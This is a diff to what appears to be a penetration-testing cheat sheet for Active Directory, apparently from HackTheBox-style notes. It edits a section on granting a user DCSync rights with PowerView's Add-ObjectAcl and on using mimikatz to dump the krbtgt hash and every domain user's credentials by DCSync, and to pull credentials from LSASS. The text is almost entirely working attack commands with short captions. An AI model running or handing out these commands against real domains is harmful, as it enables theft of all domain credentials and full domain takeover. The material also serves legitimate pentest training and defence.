@@ -148,11 +148,16 @@ If the current user lacks the required permissions run this command on the DC to
 Add-ObjectAcl -TargetDistinguishedName "dc=<domain>,dc=local" -PrincipalSamAccountName <user> -Rights DCSync -Verbose
 ```
 
-Run mimikatz on the DC
+Dump using DCSync. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts can run DCSync and retrieve credentials.
 
 ```
+lsadump::dcsync /user:krbtgt                    //DC credentials
+lsadump::dcsync /domain:htb.local /all /csv     //dump all users
+```
+
+Dump credentials from LSASS
+
+```
+sekurlsa::krbtgt
 lsadump::lsa /inject /name:krbtgt
-lsadump::lsa /patch
-lsadump::trust /patch
-lsadump::dcsync /user:krbtgt
 ```
